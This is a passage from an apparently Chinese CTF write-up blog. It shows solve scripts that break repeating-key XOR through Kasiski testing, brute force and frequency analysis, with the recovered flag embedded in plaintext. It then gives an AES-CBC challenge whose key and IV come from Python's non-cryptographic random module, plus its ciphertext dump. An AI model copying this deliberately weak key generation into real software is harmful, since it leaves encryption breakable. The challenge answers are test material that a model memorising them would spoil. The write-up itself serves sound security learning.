</span></span><span class=line><span class=cl>        <span class=n>width</span> <span class=o>=</span> <span class=nb>max</span><span class=p>(</span><span class=n>width</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=n>pre_sort</span><span class=o>.</span><span class=n>sort</span><span class=p>(</span><span class=n>key</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>t</span><span class=p>:</span><span class=n>t</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>t</span> <span class=ow>in</span> <span class=n>pre_sort</span><span class=p>[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;key length: </span><span class=si>{</span><span class=nb>str</span><span class=p>(</span><span class=n>t</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=n>width</span><span class=p>,</span> <span class=s2>&#34; &#34;</span><span class=p>)</span><span class=si>}</span><span class=s1> with probability </span><span class=si>{</span><span class=n>t</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>pre_sort</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span>
</span></span></code></pre></div><p>多字节秘钥xor，利用gift_from_sias27.py中的kasiski_test算出秘钥长度为5，再将密文分组，每组的秘钥为1字节，可根据明文特征（可打印字符；字频；等等）爆破出秘钥</p><p><a href=https://idafchev.github.io/crypto/2017/04/13/crypto_part1.html target=_blank rel="noopener noreffer">加密 - 第1部分。打破异或加密。|戒指0x00 (idafchev.github.io)</a></p><p>exp.py：</p><p>可打印字符（慢</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gift_from_sias27</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=n>xor</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;encrypted_book&#34;</span><span class=p>,</span><span class=s2>&#34;rb&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>len</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>f</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># m = gift_from_sias27.kasiski_test(f)</span>
</span></span><span class=line><span class=cl><span class=c1># print(m)</span>
</span></span><span class=line><span class=cl><span class=c1># keylength = 5</span>
</span></span><span class=line><span class=cl><span class=c1># b = [[] for _ in range(keylength)]</span>
</span></span><span class=line><span class=cl><span class=c1># for i in range(len):</span>
</span></span><span class=line><span class=cl><span class=c1>#     b[i%keylength].append(f[i])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># key = [string.ascii_lowercase for _ in range(5)]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># for i in range(5):</span>
</span></span><span class=line><span class=cl><span class=c1>#     for k in string.ascii_lowercase:</span>
</span></span><span class=line><span class=cl><span class=c1>#         m = xor(b[i],k)</span>
</span></span><span class=line><span class=cl><span class=c1>#         for char in m.decode():</span>
</span></span><span class=line><span class=cl><span class=c1>#             if char not in string.printable:</span>
</span></span><span class=line><span class=cl><span class=c1>#                 key[i] = key[i].replace(k,&#34;&#34;)</span>
</span></span><span class=line><span class=cl><span class=c1>#                 break</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;deinpqrsty&#39;</span><span class=p>,</span> <span class=s1>&#39;akpqrtuvw&#39;</span><span class=p>,</span> <span class=s1>&#39;ehiklmnorxy&#39;</span><span class=p>,</span> <span class=s1>&#39;bciprsuvw&#39;</span><span class=p>,</span> <span class=s1>&#39;bcdefgorsx&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>i</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>k1</span> <span class=ow>in</span> <span class=n>key</span><span class=p>[</span><span class=mi>0</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k2</span> <span class=ow>in</span> <span class=n>key</span><span class=p>[</span><span class=mi>1</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>k3</span> <span class=ow>in</span> <span class=n>key</span><span class=p>[</span><span class=mi>2</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>k4</span> <span class=ow>in</span> <span class=n>key</span><span class=p>[</span><span class=mi>3</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=n>k5</span> <span class=ow>in</span> <span class=n>key</span><span class=p>[</span><span class=mi>4</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                    <span class=n>k</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>k1</span><span class=o>+</span><span class=n>k2</span><span class=o>+</span><span class=n>k3</span><span class=o>+</span><span class=n>k4</span><span class=o>+</span><span class=n>k5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>flag</span> <span class=o>=</span> <span class=n>xor</span><span class=p>(</span><span class=n>f</span><span class=p>,</span><span class=n>k</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                    <span class=n>i</span><span class=o>+=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=s2>&#34;flag{&#34;</span> <span class=ow>in</span> <span class=n>flag</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=n>k</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                        <span class=nb>input</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis 
</span></span></span><span class=line><span class=cl><span class=s1>aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit 
</span></span></span><span class=line><span class=cl><span class=s1>qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur? Sic secretum dabo tibi: flag{frequency_analysis_could_be_useful#A6DC1D643A29}. At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium voluptatum deleniti atque corrupti quos dolores et quas molestias excepturi sint occaecati cupiditate non provident, similique sunt in culpa qui officia deserunt mollitia animi, id est laborum et dolorum fuga. Et harum quidem rerum facilis est et expedita distinctio. Nam libero tempore, cum soluta nobis est eligendi optio cumque nihil impedit quo minus id quod maxime placeat facere possimus, omnis voluptas assumenda est, omnis dolor repellendus. Temporibus autem quibusdam et aut officiis debitis aut rerum necessitatibus saepe eveniet ut et voluptates repudiandae sint et molestiae non recusandae. Itaque earum rerum hic tenetur a sapiente delectus, ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat.
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>qtmvg&#39;&#39;&#39;</span>
</span></span></code></pre></div><p>字频分析</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;encrypted_book&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=n>enc</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>enc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>keylen</span> <span class=o>=</span> <span class=mi>5</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>ki</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>keylen</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>dic</span> <span class=o>=</span> <span class=nb>dict</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>enc</span><span class=p>)</span> <span class=o>-</span> <span class=n>ki</span><span class=p>,</span> <span class=n>keylen</span><span class=p>):</span>
</span></span><span class=line><span class=cl>		<span class=n>dic</span><span class=p>[</span><span class=n>enc</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=n>ki</span><span class=p>]]</span> <span class=o>=</span> <span class=n>dic</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>enc</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=n>ki</span><span class=p>],</span> <span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>	<span class=n>x</span> <span class=o>=</span> <span class=nb>max</span><span class=p>(</span><span class=n>dic</span><span class=o>.</span><span class=n>keys</span><span class=p>(),</span> <span class=n>key</span><span class=o>=</span><span class=k>lambda</span> <span class=n>x</span><span class=p>:</span><span class=n>dic</span><span class=p>[</span><span class=n>x</span><span class=p>])</span>
</span></span><span class=line><span class=cl>	<span class=n>key</span> <span class=o>+=</span> <span class=p>[</span><span class=n>x</span> <span class=o>^</span> <span class=nb>ord</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>)]</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>xor</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>enc</span><span class=p>))</span>
</span></span></code></pre></div><h4 id=aes>AES?</h4><p>task.py：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>binascii</span> <span class=kn>import</span> <span class=n>b2a_hex</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>libnum</span> <span class=kn>import</span> <span class=n>s2n</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>random</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>secret</span> <span class=kn>import</span> <span class=n>flag</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add_to_16</span><span class=p>(</span><span class=n>text</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>text</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span> <span class=o>%</span> <span class=mi>16</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span> <span class=o>=</span> <span class=mi>16</span> <span class=o>-</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>text</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span> <span class=o>%</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>text</span> <span class=o>=</span> <span class=n>text</span> <span class=o>+</span> <span class=p>(</span><span class=s1>&#39;</span><span class=se>\0</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=n>add</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>text</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>init</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>r1</span> <span class=o>=</span> <span class=n>getrandbits</span><span class=p>(</span><span class=mi>64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r2</span> <span class=o>=</span> <span class=n>getrandbits</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{:X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>r1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>salt</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{:X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>r2</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>+=</span> <span class=n>salt</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>add_to_16</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>encrypt</span><span class=p>(</span><span class=n>m</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=n>iv</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>mode</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span>
</span></span><span class=line><span class=cl>    <span class=n>cryptos</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>mode</span><span class=p>,</span> <span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher_text</span> <span class=o>=</span> <span class=n>cryptos</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>m</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>cipher_text</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>chall</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>iv</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>old_m</span> <span class=o>=</span> <span class=n>init</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>=</span> <span class=n>encrypt</span><span class=p>(</span><span class=n>old_m</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>b2a_hex</span><span class=p>(</span><span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span><span class=o>==</span><span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;msg.txt&#34;</span><span class=p>,</span> <span class=s1>&#39;w+&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>old_key</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;73E5602B54FE63A5&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>old_iv</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;B435AE462FBAA662&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>208</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>old_c</span> <span class=o>=</span> <span class=n>chall</span><span class=p>(</span><span class=n>old_key</span><span class=p>,</span> <span class=n>old_iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>{}</span><span class=se>\n</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>old_c</span><span class=o>.</span><span class=n>decode</span><span class=p>()))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>salt</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{:X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>getrandbits</span><span class=p>(</span><span class=mi>32</span><span class=p>))</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>flag</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> <span class=o>+</span> <span class=n>salt</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{:X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>getrandbits</span><span class=p>(</span><span class=mi>64</span><span class=p>))</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>iv</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{:X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>getrandbits</span><span class=p>(</span><span class=mi>64</span><span class=p>))</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>=</span> <span class=n>encrypt</span><span class=p>(</span><span class=n>add_to_16</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>decode</span><span class=p>()),</span> <span class=n>key</span><span class=p>,</span> <span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;c = </span><span class=si>%r</span><span class=s2>&#34;</span><span class=o>%</span><span class=p>(</span><span class=n>b2a_hex</span><span class=p>(</span><span class=n>c</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># c = b&#39;c82dc20b7512d03f1a0982eb8a6e855db20f6fe3ff8d202a6fb74c6522fa6e623c6abe6725cafe78f9624ad59f3e90af6f985f38f75ec4d62ff7e02bd7c2f051&#39;</span>
</span></span></code></pre></div><p>msg.txt：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>73b9dad54a5fad919e9fc68e60fe25f8d98d5ac2d564d1f2885a6b744da3eb95
</span></span><span class=line><span class=cl>5a63a00cd3bdfc8eb5fbf3c6113bd1c50112fd52b775a2791c07b32b8defb823
</span></span><span class=line><span class=cl>48536d1739a3cf9434664cfd5d78083e97cee2cc79145c5d7097c4ed92cc9878
</span></span><span class=line><span class=cl>1fd06c0604a698665d53ead825acef03e301b35b826bcbcb83430cd4f81134b7
</span></span><span class=line><span class=cl>7fd0d848ba8f4c2599f25a6a6cc57fd2f3ca792a6af078264d8a9d9b5a747ed9
</span></span><span class=line><span class=cl>2a66f0f894e216ee6aae4dd186536144b7a60c12a916074918d7bd123bca9333
</span></span><span class=line><span class=cl>ddfb6b0a744e65e5003c4c6aed23e1c0213797a4cdfc9a4f62e07fca48d8b99e
</span></span><span class=line><span class=cl>923e3e4ce4ebd1ef1c7e2a86cd0fcd6262c88629c5a65a8c03bce2a2c55492ee
</span></span><span class=line><span class=cl>6c4d3552c0a3008ed23eb0c46432f2319a31977563fcf3d601b8386fa7a801f2
</span></span><span class=line><span class=cl>b8a898264d71ef88c7462696a37fd169739907b28a4c75bba92ec2faa5c78217
</span></span><span class=line><span class=cl>f530968ffc419034b7f971e56db15bef7bb31000ffc36449f46e92b5145e0446
</span></span><span class=line><span class=cl>0a626ab669306331b4fac480af6918142e26005d9eadc99d857dcb0713c2877d
</span></span><span class=line><span class=cl>e54c02740855a7a2be864b3980baf39a9e0f93d666c2e416119d45fbc76315c2
</span></span><span class=line><span class=cl>9a484a9584d2d07536e52802f01b35bbbb06cfaf3cdee5ddcc8573ecfd63e259
</span></span><span class=line><span class=cl>d6d61d1b28ef45e333b4a547b8c81a00784dffba9a83fc4bab6980cb80dc7a75
</span></span><span class=line><span class=cl>b0f1de7800eebbd2028e176c0cd03125a6a3d76f66b0a38c7bfd40f43d922ab3
</span></span><span class=line><span class=cl>e76113219629529495aed07d7ce6760f6c2f779d9451a510e94676718cba7664
</span></span><span class=line><span class=cl>d323458009d2f1abecf1471849a259d6354039d7e71d164faad425985204ca0e
</span></span><span class=line><span class=cl>5a021f9be481893004ad1140cbd168b0928f19934c73310e7091ef33d012bbf1
</span></span><span class=line><span class=cl>f6c33af2ec91438022317f65e55e3d51d7e361e43e8177f0376fd82e49db6d5c
</span></span><span class=line><span class=cl>190da978d4087f85027d8d5b927db015335b9fa70539d5021ca9591d56f4c536
</span></span><span class=line><span class=cl>fa63a12e1fb241d5a55a9e858c1662c3086d41d8367dd6037aa39ecb5f6254f8
</span></span><span class=line><span class=cl>a6be63185dd27cb798cbe7785669b7e743c2d9b8b4096f28f3ec8f94e7c15441
</span></span><span class=line><span class=cl>dce2936844314ce8d01a8522644d9893c774f1b6b061b62bdb2dbd0d86cc921f
</span></span><span class=line><span class=cl>941076d7f1e22ed7dbf28afe4f292171cdbf706fb80bef6295a77a74e562b6a9
</span></span><span class=line><span class=cl>6b9de91b9f18a08bfaa3fd0bdc39f0623cd215489d482e65a64002da7494f1b8
</span></span><span class=line><span class=cl>cd1d68d2dcfdd940630cb4b2de1b6e79017c82c73a462525fa5b21a128699788
</span></span><span class=line><span class=cl>c91faaba097e6721c9d4db4ac4200c0ed142a917abb696225116b641b94a6682
</span></span><span class=line><span class=cl>50176ca5ecc5c4043a981389b0bc1884a1d977b9129ebfb6d52c95715c20de2e
</span></span><span class=line><span class=cl>489af2e971d32c0ff71a51f685899d13ea7849a6448af3589dc24dd98fafb4a9
</span></span><span class=line><span class=cl>dda667e7683b07df1bed9952dbcbfd19bb7530ee99e56c60ee696a1eb2d4668d
</span></span><span class=line><span class=cl>35a0f733461deb274bcb3239fd841e61a1c4ed3ef8de0c8c9e95bb1bcff9f984
</span></span><span class=line><span class=cl>b2cd7cb9ad68170d9a5ca671bda330e8ba475f3432e77a2088ac1b1409d47be6
</span></span><span class=line><span class=cl>b7f59b83c352cd091ad3f6bf7071fc216756c064b889248cf59d8ec613296b88
</span></span><span class=line><span class=cl>e07b0165dfa4fdf153fd5d7a8e6874f1bea78104a135abaff801a58e8ce64c88
</span></span><span class=line><span class=cl>5de6ef8309cc053df87d49153c8aa7e3923ddc914f9592c9426bbd8d56a088f0
</span></span><span class=line><span class=cl>458c730b6250964390315ab504e193b2c7c8baf085a970b312ebb7b947decf44
</span></span><span class=line><span class=cl>88100075ab3298cf0dee6f693f87b7ec45546cb5ab804f1e578ce893ac9bb91b
</span></span><span class=line><span class=cl>62178d5691d30291f45309f5cd2dc99946b31b0e24df5c47b3c99effa3178061
</span></span><span class=line><span class=cl>9aa3550cc8b4075525f8ef57aab4785774af0cfeb765fe56776601c61ddb6e40
</span></span><span class=line><span class=cl>975600403108047d468908782a442a2b14911f277c6623a8d3989604a2227279
</span></span><span class=line><span class=cl>b42e52ae866c19418ed5660bae0fab6b9cac9788a1aa4372f047cb862222e176
</span></span><span class=line><span class=cl>362a5ce410e21456432a9089ac1343658d44168ed05c201271cd99b258cf8dc6
</span></span><span class=line><span class=cl>7eae7375eb2ab68982b2a959eb977477246954ccd2c84b6159a7f8739599713f
</span></span><span class=line><span class=cl>58da1d1777705fc73af1cb65d56961ef01947f1c3f0755f535b7ab5793b17141
</span></span><span class=line><span class=cl>4754b6863ec18da8f698230a762c73e53c02d609d7325a37dde43ca94649bb71
</span></span><span class=line><span class=cl>ade33f8bb371b96c3270407bf7528750565b86ea35cb8ce8f7e64d0b22cbd1e8
</span></span><span class=line><span class=cl>2c10d9b588bd147c60423b96d31a4c2e773d23ec55c2182804dfce5ec7483047
</span></span><span class=line><span class=cl>08d429abc638b49b7a6e2515dfd8f4660e71a14c5d3f269e46cc1d1c115d79bf
</span></span><span class=line><span class=cl>61f79daa0a1e947f643fcfda3b435f2f89cdbd5c217bd7dde7e1bc99f4bc15d6
</span></span><span class=line><span class=cl>1d3514d5d8e30ed2279895837805c1c03f74d6ea6907c2f369e648118d8142dc
</span></span><span class=line><span class=cl>a6f791bd71bc72408db8e711b2f2e63fa09fed2f89811a46b59aa9f03fa0aa9b
</span></span><span class=line><span class=cl>cb5c2b3236c9830f19f23704216da197b9a69e02b8f4894b6bd4496898170a8d
</span></span><span class=line><span class=cl>ddeca8291684e0227fc27e3418defa700f9f5f21480b105d954c3f18d3105739
</span></span><span class=line><span class=cl>759834ac3b996261a779fce7aa89e0db32faa2d08683aca64afcc54cc3c4ee7d
</span></span><span class=line><span class=cl>b20543ae7839ee4ba037446feac5c7eea696d538b583c029a2369c045db9437d
</span></span><span class=line><span class=cl>e79523d2034fbaee301e732dc95573a9152b7b94f05c0c921e5db89bc6f7a928
</span></span><span class=line><span class=cl>54d51ddc9a8457c569a63b57f9f9760891825f6ef8b39192ec5093b3ca4d4ff0
</span></span><span class=line><span class=cl>41aa619830c565c138eb7ab67fa9d524808a9fa25489774c9a784905602c3166
</span></span><span class=line><span class=cl>8c8820758d0a6c9c9a584aa51e0ab0c549d74364cc25e36ab5ec238546ba5505
</span></span><span class=line><span class=cl>e98413350cbb1221e8493c0ca4d19537046bdaffc66cb1c2acdb1ff0c7555470
</span></span><span class=line><span class=cl>4015d931ba40bd4e25d8ce26b66267d720ebcc26dba774c84f385848f2a35f30
</span></span><span class=line><span class=cl>fe756bcfdbf0d07feb07b400a695d0c534227f8cb79a872781a2d2a1f590f6ec
</span></span><span class=line><span class=cl>0cb5c31cd1a16495f20744e95ed294df0c3671f52247411b5bef37c185d21d71
</span></span><span class=line><span class=cl>6d61c1f3052156a34669fd41b982d1230673304a4ef979fc27a586b9adc7a14c
</span></span><span class=line><span class=cl>a48ce83836d376a2163c6cfea937d1c0b924eb5000140ba550c0894fcd2fc9da
</span></span><span class=line><span class=cl>8dd625ef6e7b50fd14c110bdaab654b619ec4c4661dd64091696ad1cffd40fcc
</span></span><span class=line><span class=cl>58acd76b3741741bffe0db63bb7574a269b5c490748ee629a20b7dbadd3753dd
</span></span><span class=line><span class=cl>d20618e3ab47c37ba5e2b7feec752b4233fb926342c8028b6da868a6099ee75a
</span></span><span class=line><span class=cl>e5453e27b13176514ce20c98290c8d3581969f2b801b47a03e8f3f55cad128fa
</span></span><span class=line><span class=cl>a01f5e6b74081d59a93eac02bfe4753b20bd30745abfa6a9d987e5136bb0cd6f
</span></span><span class=line><span class=cl>6bf42de0b54a73805ae684de95d7acfeb68adb6dfbcdf5dc0332b7c3b46d103d
